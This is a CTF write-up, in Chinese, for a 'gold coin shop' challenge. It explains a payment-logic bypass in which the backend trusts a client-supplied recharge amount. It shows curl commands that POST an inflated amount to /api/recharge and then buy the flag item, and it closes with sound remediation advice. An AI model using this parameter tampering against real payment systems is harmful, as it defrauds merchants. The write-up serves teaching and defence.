# 金币商店 - WriteUP

## 设计缺陷分析

本题考察的是**支付逻辑绕过**，属于 OWASP A06 Insecure Design 的典型场景。

系统的充值接口 `/api/recharge` 存在严重的设计缺陷：
- 前端页面限制了充值金额的选择（仅 10/50/100 金币）
- 但后端接口直接根据前端传入的 `amount` 参数增加用户余额
- 没有任何实际的支付验证、签名校验或金额上限检查（除了必须大于 0）

这种设计假设"用户只会通过前端页面操作"，忽略了攻击者可以直接构造 HTTP 请求。

## 利用步骤

### 步骤1：查看当前余额和商品

```bash
curl http://target/api/user
curl http://target/api/products
```

### 步骤2：直接发送充值请求，将金额改为10000

```bash
curl -X POST http://target/api/recharge \
  -H "Content-Type: application/json" \
  -d '{"amount": 10000}'
```

### 步骤3：购买Flag商品

```bash
curl -X POST http://target/api/buy \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1}'
```

## 修复建议

1. **引入真实支付网关**：充值金额必须经过第三方支付平台验证，不能仅依赖前端传入的参数
2. **金额白名单校验**：后端严格校验 `amount` 必须在允许的列表中（如 `[10, 50, 100]`）
3. **请求签名机制**：对关键参数进行 HMAC 签名，防止篡改
4. **Rate Limiting**：限制充值频率，防止滥用
5. **业务逻辑校验**：充值记录应与实际支付流水一一对应
